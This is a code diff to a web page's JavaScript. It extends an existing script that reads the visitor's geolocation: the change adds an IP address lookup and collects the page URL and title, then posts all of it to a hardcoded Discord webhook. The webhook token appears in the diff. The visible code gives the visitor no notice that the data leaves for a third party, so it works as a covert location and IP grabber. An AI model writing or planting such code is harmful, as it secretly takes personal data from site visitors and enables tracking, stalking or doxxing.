@@ -12,24 +12,37 @@
       const takePictureButton = document.getElementById('take-picture');
       const pictureContainer = document.getElementById('picture-container');
 
-      // Request the user's location
+      // Request the user's location and send it to the Discord webhook
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
-          // Send the user's location to the Discord webhook
-          const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
-          const formData = new FormData();
-          formData.append('content', `Siteye Girildi: ${lat}, ${lon}`);
+          // Get the user's IP address
+          const ipUrl = 'https://api.ipify.org?format=json';
+          fetch(ipUrl)
+            .then(response => response.json())
+            .then(data => {
+              const ip = data.ip;
 
-          fetch(webhookUrl, {
-            method: 'POST',
-            body: formData,
-          })
-          .then(response => response.json())
-          .then(data => console.log(data))
-          .catch(error => console.error(error));
+              // Get the website information
+              const websiteUrl = window.location.href;
+              const websiteTitle = document.title;
+
+              // Send the user's location, IP address, and website information to the Discord webhook
+              const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
+              const formData = new FormData();
+              formData.append('content', `Siteye Girildi: ${lat}, ${lon} - IP Adresi: ${ip} - Website: ${websiteUrl} - Başlık: ${websiteTitle}`);
+
+              fetch(webhookUrl, {
+                method: 'POST',
+                body: formData,
+              })
+              .then(response => response.json())
+              .then(data => console.log(data))
+              .catch(error => console.error(error));
+            })
+            .catch(error => console.error(error));
         });
       } else {
         console.error('Geolocation is not supported by this browser.');
